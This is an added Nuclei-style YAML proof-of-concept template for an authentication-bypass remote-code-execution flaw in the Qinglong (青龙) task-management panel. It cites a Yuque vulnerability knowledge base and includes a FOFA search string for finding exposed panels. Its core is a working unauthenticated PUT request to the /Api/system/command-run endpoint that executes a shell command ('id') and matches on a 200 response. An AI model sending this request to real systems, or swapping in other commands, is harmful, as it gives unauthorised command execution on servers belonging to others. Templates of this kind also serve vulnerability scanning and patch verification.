@@ -1,0 +1,40 @@
+id: poc-rrgp30gygtnnqhd8
+info:
+  name: 青龙面板command-run鉴权绕过导致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rrgp30gygtnnqhd8'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rrgp30gygtnnqhd8
+    fofa: app="青龙-定时任务管理面板"
+http:
+- raw:
+  - 'PUT /Api/system/command-run HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Content-Type: application/json
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+
+    Content-Length: 34
+
+
+    {"command": "id"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
